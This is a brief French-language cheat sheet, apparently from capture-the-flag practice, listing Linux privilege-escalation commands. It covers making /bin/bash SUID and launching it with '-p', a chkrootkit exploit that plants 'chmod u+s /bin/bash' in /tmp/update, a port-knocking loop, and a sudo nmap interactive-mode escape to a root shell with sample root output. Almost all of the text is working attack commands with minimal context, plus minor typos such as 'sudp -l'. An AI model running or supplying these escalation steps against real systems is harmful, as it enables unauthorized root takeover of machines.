GTOBin site reference : https://gtfobins.org/#


### /bin/bash
```bash 
#!/bin/bash
chmod u+s /bin/bash
```

Le lancer en sudo 
```bash 
/bin/bash -p

```
```bash
# Port knocking
for x in PORT1 PORT2 PORT3; do nmap -Pn --max-retries 0 -p $x IP; done

# chkrootkit privesc
echo 'chmod u+s /bin/bash' > /tmp/update && chmod +x /tmp/update

# SUID bash
/bin/bash -p
```


### Nmap
```bash
# Indentification
sudp -l
(root) NOPASSWD: /usr/bin/nmap

# Exploitation Avec GTOBINS
python -c 'import pty; pty.spawn("/bin/bash")'
sudo nmap --interactive
nmap> !sh
id 
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
```
